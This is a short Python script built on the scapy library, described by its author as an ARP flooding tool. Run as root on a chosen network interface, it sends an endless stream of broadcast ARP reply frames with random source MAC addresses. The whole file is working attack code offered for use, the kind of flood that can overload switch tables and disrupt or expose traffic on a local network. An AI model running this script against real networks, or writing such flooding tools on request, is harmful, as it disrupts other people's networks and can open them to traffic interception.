#!/usr/bin/env python
'''
Author: Veerendra.K
Description: A simple ARP packets flooding script
'''
from scapy.all import *
import argparse
import time

iface=conf.iface

def flood():
    destMAC = "FF:FF:FF:FF:FF:FF"
    x=0
    while 1:
        randMAC=RandMAC()
        sendp(Ether(src=randMAC ,dst=destMAC)/ARP(op=2, psrc="0.0.0.0", hwdst=destMAC)/Padding(load="X"*18),verbose=0)
        print randMAC+" -> {} [{}]".format(iface,x)
        x=x+1
        time.sleep(0.5)

if __name__=="__main__":
    if not os.geteuid() == 0:
        print "[ERROR]".ljust(8," "),"Script must run with 'sudo'"
        print "For Help: sudo python arpflood.py -h"
        exit(1)
    parser = argparse.ArgumentParser(description='ARP flooding')
    parser.add_argument('-i', action='store', dest='iface',help='Inteface')
    parser.add_argument('-v', action='version', version='%(prog)s 3.0')
    results=parser.parse_args()
    if results.iface:
        iface=results.iface
    flood()
